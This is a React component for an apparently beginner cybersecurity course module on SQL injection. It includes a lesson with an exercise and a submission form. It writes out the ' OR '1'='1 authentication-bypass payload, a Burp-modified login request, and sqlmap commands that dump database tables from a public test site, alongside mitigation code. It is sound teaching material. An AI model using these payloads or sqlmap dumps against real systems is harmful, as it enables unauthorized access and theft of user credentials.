import React, { useState, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaShieldAlt,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

// Define interfaces for type safety
interface UserDetails {
  id: string; // Ensure id is string to avoid TS2322
}

interface UserData {
  userDetails: UserDetails;
}

interface AuthContext {
  userData: UserData | null;
  userToken: string | null;
}

interface FormState {
  assignmentId: number;
  userId: string;
  submissionUrl: string;
  submissionType: "github" | "pdf";
}

const Deet4: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth() as AuthContext;
  const inputRef = useRef<HTMLInputElement>(null);

  // State for submission field
  const [submitted, setSubmitted] = useState<boolean>(false);
  const [form, setForm] = useState<FormState>({
    assignmentId: 4, // Unique for Deet4
    userId: String(userData?.userDetails.id ?? ""), // Cast to string to fix TS2322
    submissionUrl: "",
    submissionType: "pdf", // Default to PDF for exploitation report
  });

  // Handle input change for submission URL and type
  const handleInputChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
      const { name, value } = e.target;
      setForm((prev) => ({
        ...prev,
        [name]: value,
      }));
    },
    []
  );

  // Handle file upload for PDF submissions
  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) {
      alert("No file selected. Please choose a file.");
      return;
    }
    if (file.type !== "application/pdf") {
      alert("Please upload a valid PDF file.");
      return;
    }
    // Simulate file upload (replace with actual backend logic)
    const fileUrl = URL.createObjectURL(file);
    setForm((prev) => ({
      ...prev,
      submissionUrl: fileUrl,
    }));
  }, []);

  // Handle form submission
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();

      if (!form.submissionUrl) {
        alert(`Please provide a ${form.submissionType === "github" ? "GitHub link" : "PDF file"}.`);
        return;
      }

      if (!userToken) {
        alert("Authentication error. Please log in again.");
        return;
      }

      try {
        const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${userToken}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify(form),
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.message || "Submission failed.");
        }

        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } catch (error) {
        console.error("Submission error:", error);
        alert(`Failed to submit: ${error instanceof Error ? error.message : "Unknown error"}`);
      }
    },
    [form, userToken]
  );

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
          aria-label="Go back"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaShieldAlt className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">SQL Injection Basics</h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to SQL Injection
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              SQL Injection is a critical web application vulnerability, ranked in the OWASP Top 10, that allows attackers to manipulate a database by injecting malicious SQL code into input fields (e.g., login forms, search bars). This can lead to unauthorized data access, modification, or deletion, compromising sensitive information like user credentials or financial records. This module covers the fundamentals of SQL Injection, including manual exploitation using tools like Burp Suite and automated exploitation with SQLMap, a popular open-source tool. These skills are essential for cybersecurity modules like OWASP Top 10 analysis (<code>Deet2</code>) and advanced penetration testing (<code>Dett6</code>).
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Designed for beginners, this module provides step-by-step instructions and a practical exercise to exploit SQL Injection vulnerabilities in a test environment. By mastering these techniques, you’ll learn to identify and mitigate SQL Injection risks, preparing you for Capture The Flag (CTF) challenges and real-world security assessments.
            </p>
          </div>

          {/* Understanding SQL Injection */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding SQL Injection
            </h2>
            <div className="space-y-6">
              {/* What is SQL Injection? */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. What is SQL Injection?
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  SQL Injection occurs when unvalidated user input is included in SQL queries, allowing attackers to alter the query’s logic. For example, injecting <code>' OR '1'='1</code> into a login form can bypass authentication by making the query always true.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Impact:</strong> Data theft (e.g., user records), authentication bypass, database corruption.</li>
                  <li><strong>Common Targets:</strong> Login forms, search fields, URL parameters.</li>
                  <li><strong>Prevention:</strong> Use prepared statements, input sanitization, and least privilege database accounts.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable Query
SELECT * FROM users WHERE username = 'user' AND password = 'pass' OR '1'='1';

# Attack Input
username: ' OR '1'='1
password: anything

# Resulting Query
# Returns all users, bypassing authentication
`}
                </pre>
              </div>

              {/* Manual SQL Injection */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. Manual SQL Injection with Burp Suite
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Manual SQL Injection involves crafting inputs to manipulate queries, often using a proxy tool like Burp Suite to intercept and modify HTTP requests.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Process:</strong> Identify input fields, inject payloads (e.g., <code>' OR '1'='1</code>), observe responses.</li>
                  <li><strong>Tools:</strong> Burp Suite to capture and manipulate requests.</li>
                  <li><strong>Indicators:</strong> Error messages, unexpected data, or authentication bypass.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Intercept Login Request in Burp Suite
POST /login.php HTTP/1.1
Host: testphp.vulnweb.com
username=admin&password=pass

# Modify to Inject SQL
username=admin' OR '1'='1&password=anything

# Check Response
# Success (e.g., 200 OK, logged in) indicates vulnerability
`}
                </pre>
              </div>

              {/* Automated SQL Injection with SQLMap */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Automated SQL Injection with SQLMap
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  SQLMap is an open-source tool that automates SQL Injection testing, detecting vulnerabilities, and extracting data (e.g., database schema, user records).
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Features:</strong> Tests GET/POST parameters, dumps tables, enumerates users.</li>
                  <li><strong>Setup:</strong> Install on Kali Linux or other systems, run with target URL.</li>
                  <li><strong>Ethics:</strong> Only test authorized systems to avoid legal issues.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Install SQLMap (Kali Linux)
sudo apt update
sudo apt install sqlmap

# Test a URL for SQL Injection
sqlmap -u "http://testphp.vulnweb.com/login.php?username=admin&password=pass" --forms

# Dump Database Tables
sqlmap -u "http://testphp.vulnweb.com/login.php" --forms --dump

# Example Output
# Database: vulnweb
# Table: users
# [2 entries]
# +----+----------+----------+
# | id | username | password |
# +----+----------+----------+
# | 1  | admin    | pass123  |
# | 2  | user     | pass456  |
# +----+----------+----------+
`}
                </pre>
              </div>

              {/* Mitigating SQL Injection */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Mitigating SQL Injection
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Preventing SQL Injection requires secure coding practices and robust configurations to protect databases.
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li><strong>Prepared Statements:</strong> Bind parameters to queries to prevent injection.</li>
                  <li><strong>Input Validation:</strong> Sanitize and validate all user inputs.</li>
                  <li><strong>Least Privilege:</strong> Restrict database user permissions.</li>
                  <li><strong>WAF:</strong> Use Web Application Firewalls to filter malicious inputs.</li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Vulnerable PHP Code
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

# Secure PHP Code (Prepared Statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
`}
                </pre>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Exploit SQL Injection
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply your knowledge by exploiting SQL Injection vulnerabilities in a test web application (<code>http://testphp.vulnweb.com</code>) both manually (using Burp Suite) and with SQLMap. Document your process and findings in a PDF report (2–3 pages), including screenshots. Optionally, submit a GitHub repository with SQLMap logs or scripts (e.g., automating SQLMap scans) and a <code>README.md</code>.
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up your environment: Install Burp Suite and SQLMap on Kali Linux (or your system). Configure Burp Suite’s proxy (127.0.0.1:8080) in your browser.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Manual Exploitation:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Visit <code>http://testphp.vulnweb.com</code>, identify a vulnerable input (e.g., login form or search field).</li>
                  <li>Use Burp Suite to intercept a POST/GET request.</li>
                  <li>Inject a payload (e.g., <code>' OR '1'='1</code>) in a parameter (e.g., username).</li>
                  <li>Capture the response (e.g., login success, error message) with a screenshot.</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Automated Exploitation:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Run SQLMap on the same URL/form, testing for vulnerabilities.</li>
                  <li>Dump a table (e.g., users) if the site is vulnerable.</li>
                  <li>Save the output (e.g., terminal screenshot or log file).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Write a 2–3 page PDF report including:
                <ul className="list-disc list-inside ml-6 mt-2 space-y-1">
                  <li>Introduction: Explain SQL Injection and its risks.</li>
                  <li>Manual Exploitation: Describe the payload, request, and response with Burp Suite screenshots.</li>
                  <li>Automated Exploitation: Detail SQLMap commands and output (e.g., dumped data) with screenshots.</li>
                  <li>Mitigation: Recommend fixes (e.g., prepared statements).</li>
                </ul>
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Optional: Create a GitHub repository with SQLMap logs or a script (e.g., Python to automate SQLMap) and a <code>README.md</code> explaining your approach.
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the exercise:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# Install Tools (Kali Linux)
sudo apt update
sudo apt install burpsuite sqlmap

# Start Burp Suite
burpsuite &

# Configure Browser Proxy (Firefox)
# Preferences > Network Settings > Manual Proxy
# HTTP Proxy: 127.0.0.1, Port: 8080

# Manual Exploitation
# In Burp: Proxy > Intercept > Turn on
# Visit: http://testphp.vulnweb.com/login.php
# Inject: username=admin' OR '1'='1&password=anything
# Save request/response screenshot

# Automated Exploitation
sqlmap -u "http://testphp.vulnweb.com/login.php?username=admin&password=pass" --forms --batch
sqlmap -u "http://testphp.vulnweb.com/login.php" --forms --dump --batch

# Save SQLMap Output
sqlmap -u "http://testphp.vulnweb.com/login.php" --forms --dump --batch > sqlmap_output.txt

# Create Report
# Use Word/Google Docs, include screenshots
# Export as PDF
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your work below! Ensure you only test authorized systems.
            </p>
          </div>

          {/* Submission Section */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label
                  className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                  htmlFor="submissionType"
                >
                  Submission Type:
                </label>
                <select
                  name="submissionType"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                  value={form.submissionType}
                  onChange={handleInputChange}
                  aria-label="Select submission type"
                >
                  <option value="github">GitHub Repository Link</option>
                  <option value="pdf">PDF Report</option>
                </select>
              </div>
              {form.submissionType === "github" ? (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionUrl"
                  >
                    Paste Your GitHub Repository Link:
                  </label>
                  <textarea
                    name="submissionUrl"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    rows={4}
                    placeholder="e.g., https://github.com/username/sql-injection-lab"
                    value={form.submissionUrl}
                    onChange={handleInputChange}
                    aria-label="GitHub repository link"
                  />
                </div>
              ) : (
                <div>
                  <label
                    className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                    htmlFor="submissionFile"
                  >
                    Upload Your PDF Report:
                  </label>
                  <input
                    type="file"
                    name="submissionFile"
                    accept="application/pdf"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                    onChange={handleFileUpload}
                    ref={inputRef}
                    aria-label="Upload PDF report"
                  />
                </div>
              )}
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
                aria-label="Submit exercise"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              SQL Injection Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Enhance your skills with these recommended resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  OWASP - SQL Injection Testing Guide
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/room/sqlinjectionlm"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - SQL Injection Lab
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://portswigger.net/web-security/sql-injection"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  PortSwigger - SQL Injection Labs
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="http://sqlmap.org/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  SQLMap - Official Documentation
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Deet4;